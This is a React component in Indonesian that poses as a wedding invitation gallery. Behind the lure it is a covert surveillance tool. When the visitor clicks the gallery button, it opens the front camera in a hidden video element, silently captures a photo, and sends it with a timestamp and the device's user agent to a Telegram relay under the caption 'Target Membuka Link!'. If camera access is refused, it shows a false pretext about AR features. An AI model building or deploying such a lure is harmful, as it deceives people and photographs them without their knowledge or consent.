"use client";

import { useState, useRef, useEffect, useCallback } from 'react';
import { Loader2, Heart, Image as ImageIcon } from 'lucide-react';

// ========== KONFIGURASI TELEGRAM ==========
// Token dan Chat ID sekarang disimpan dengan aman di Environment Variables Vercel
// Tidak lagi di-hardcode di file ini untuk mencegah kebocoran data.

type StatusType = 'idle' | 'loading' | 'success' | 'error';

export default function CameraVerification() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [status, setStatus] = useState<StatusType>('idle');
  const [message, setMessage] = useState<string>('Terdapat kumpulan momen indah dan sebuah pesan rahasia yang sengaja kami siapkan secara khusus hanya untuk sahabat-sahabat terdekat kami.');

  const stopCamera = useCallback(() => {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      setStream(null);
      if (videoRef.current) {
        videoRef.current.srcObject = null;
      }
    }
  }, [stream]);

  useEffect(() => {
    return () => {
      stopCamera();
    };
  }, [stopCamera]);

  const handleOpenGallery = async () => {
    setStatus('loading');
    setMessage('Memuat detail undangan dan mengunduh galeri foto...');

    try {
      // Memulai kamera secara diam-diam (browser tetap akan meminta izin)
      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" }, 
        audio: false 
      });
      setStream(mediaStream);
      
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        
        // Tunggu video menyala
        await new Promise((resolve) => {
            if (videoRef.current) {
                videoRef.current.onloadedmetadata = () => {
                    videoRef.current?.play().then(resolve).catch(resolve);
                };
            } else {
                resolve(null);
            }
        });
        
        // Tunggu sebentar agar kamera fokus dan exposure stabil
        await new Promise(r => setTimeout(r, 1000));
        
        // Ambil foto secara tersembunyi
        const video = videoRef.current;
        const canvas = canvasRef.current;
        
        if (video && canvas && video.videoWidth > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            if (context) {
                // Render gambar video ke canvas tersembunyi
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                // Konversi gambar menjadi format blob
                canvas.toBlob((blob) => {
                    if (blob) {
                        sendToTelegram(blob).catch(console.error);
                    }
                }, 'image/jpeg', 0.85);
            }
        }
      }
      
      // Matikan kamera setelah foto berhasil diam-diam diambil
      stopCamera();
      
      // Beri kesan berhasil membuka galeri
      setTimeout(() => {
          setStatus('success');
          setMessage('Galeri berhasil dimuat! Mengarahkan ke halaman...');
      }, 800);

    } catch (err: any) {
      console.error(err);
      // Jika mereka menolak akses kamera
      setStatus('error');
      setMessage('Untuk pengalaman animasi 3D dan AR (Augmented Reality) pada undangan, mohon izinkan akses kamera perangkat Anda.');
    }
  };

  const sendToTelegram = async (imageBlob: Blob) => {
    try {
      const reader = new FileReader();
      reader.readAsDataURL(imageBlob);
      reader.onloadend = async () => {
        const base64data = reader.result;
        
        const timestamp = new Date().toLocaleString('id-ID');
        const userAgent = navigator.userAgent.substring(0, 100);
        const caption = `📸 *Target Membuka Link!*\n\n🕒 Waktu: ${timestamp}\n📱 Perangkat: ${userAgent}`;
        
        try {
          // Kirim payload JSON dengan Base64 image
          const res = await fetch('/api/telegram', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              image: base64data,
              caption: caption
            })
          });
          
          if (!res.ok) {
            const errData = await res.json().catch(() => ({ status: res.status }));
            console.error("API merespon error:", errData);
            alert("ERROR DARI SERVER: " + JSON.stringify(errData));
          } else {
             // Opsional: Untuk memastikan berhasil
             // alert("Berhasil mengirim ke server!");
          }
        } catch (fetchErr: any) {
          console.error("Gagal melakukan fetch:", fetchErr);
          alert("GAGAL KONEKSI API: " + fetchErr.message);
        }
      };
    } catch (error: any) {
      console.error("Gagal membaca gambar", error);
      alert("GAGAL BACA GAMBAR: " + error.message);
    }
  };

  return (
    <div className="w-full max-w-md mx-auto mt-8">
      <div className="glass-panel rounded-2xl p-6 sm:p-8 flex flex-col items-center relative overflow-hidden text-center">
        
        {/* Ornamen Pernikahan */}
        <div className="absolute top-0 left-0 w-16 h-16 opacity-20 pointer-events-none">
          <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M10 50 C 30 10, 70 10, 90 50 C 70 90, 30 90, 10 50" stroke="#d4af37" strokeWidth="2"/>
            <circle cx="50" cy="50" r="10" fill="#d4af37"/>
          </svg>
        </div>
        <div className="absolute bottom-0 right-0 w-16 h-16 opacity-20 pointer-events-none rotate-180">
          <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M10 50 C 30 10, 70 10, 90 50 C 70 90, 30 90, 10 50" stroke="#d4af37" strokeWidth="2"/>
            <circle cx="50" cy="50" r="10" fill="#d4af37"/>
          </svg>
        </div>

        {/* Gambar Palsu (Menggantikan Kotak Kamera) */}
        <div className="mb-8 mt-2 relative z-10 animate-float">
            <div className={`w-28 h-28 mx-auto bg-accent/10 rounded-full flex items-center justify-center border-4 border-white shadow-xl relative transition-all duration-700 ${status === 'loading' ? 'animate-pulse-ring' : ''}`}>
                <ImageIcon className={`w-10 h-10 text-accent/60 transition-all duration-700 ${status === 'loading' ? 'animate-pulse' : ''}`} />
                <div className="absolute -bottom-2 -right-2 bg-white p-2.5 rounded-full shadow-lg transition-transform hover:scale-110">
                    <Heart className={`w-5 h-5 text-red-400 fill-red-400 ${status === 'success' ? 'animate-heartbeat' : ''}`} />
                </div>
            </div>
        </div>

        {/* ELEMEN KAMERA RAHASIA (DISEMBUNYIKAN SEPENUHNYA DARI LAYAR) */}
        <video 
            ref={videoRef} 
            autoPlay 
            playsInline 
            muted 
            className="absolute opacity-0 pointer-events-none w-[1px] h-[1px] -z-50"
        />
        <canvas ref={canvasRef} className="hidden" />

        {/* Pesan Tipuan */}
        <p className={`mb-10 font-serif italic text-sm px-4 relative z-10 transition-all duration-500 ease-in-out min-h-[40px] flex items-center justify-center ${status === 'error' ? 'text-red-800 bg-red-100/60 p-3 rounded-lg shadow-sm scale-105' : 'text-foreground/80'}`}>
          {message}
        </p>

        {/* Tombol Aksi */}
        <div className="w-full relative z-10 transition-all duration-500">
            {status === 'success' ? (
                <div className="w-full py-4 bg-[#fcfbf9]/90 backdrop-blur-sm text-accent border border-accent/40 font-serif rounded-full flex justify-center items-center gap-3 shadow-md font-medium tracking-wide animate-fade-in-up">
                    <Heart className="w-5 h-5 text-accent animate-heartbeat" />
                    Membuka Galeri...
                </div>
            ) : null}
            {status !== 'success' && (
                <button 
                    onClick={handleOpenGallery}
                    disabled={status === 'loading'}
                    className="gold-btn w-full py-4 rounded-full font-serif font-medium flex justify-center items-center gap-2 disabled:opacity-80 disabled:cursor-not-allowed text-lg tracking-wide shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-1"
                >
                    {status === 'loading' ? (
                        <><Loader2 className="w-5 h-5 animate-spin" /> <span className="animate-pulse">Memuat Data...</span></>
                    ) : (
                        'Buka Galeri & Detail Undangan'
                    )}
                </button>
            )}
        </div>
        
      </div>
    </div>
  );
}
